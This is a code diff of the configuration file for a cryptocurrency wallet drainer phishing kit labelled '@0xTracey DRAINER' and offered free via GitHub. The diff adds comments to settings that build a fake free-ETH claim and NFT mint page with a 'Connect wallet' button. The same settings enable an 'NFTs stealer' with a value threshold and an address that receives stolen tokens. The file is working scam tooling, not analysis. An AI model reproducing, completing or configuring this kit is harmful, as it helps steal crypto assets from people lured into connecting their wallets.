@@ -15,12 +15,14 @@ const collectionInfo = {
     },
 }
 
+// First page
 const indexPageInfo = {
     backgroundImage: "background.jpg", // relative path to background image (in assets)
     title: "{name}", // {name} will be replaced with collectionInfo.name
     underTitle: "Claim Your Free 1 ETH",
 }
 
+// Second page
 const claimPageInfo = {
     title: "@0xTracey DRAINER", // <br> is a line break
     shortDescription: "Get this Drainer for free though Github. @0xTracey",
@@ -32,12 +34,14 @@ const claimPageInfo = {
     imageRadius: 250, // image radius in px
 }
 
+// Drain Settings
 const drainNftsInfo = {
     active: true,   // Active (true) or not (false) NFTs stealer.
     minValue: 0.1,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
     nftReceiveAddress: "" // leave empty if you want to use the same as receiveAddress 
 }
 
+// Lil custom
 const customStrings = {
     title: "MINT {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
     connectButton: "Connect wallet",
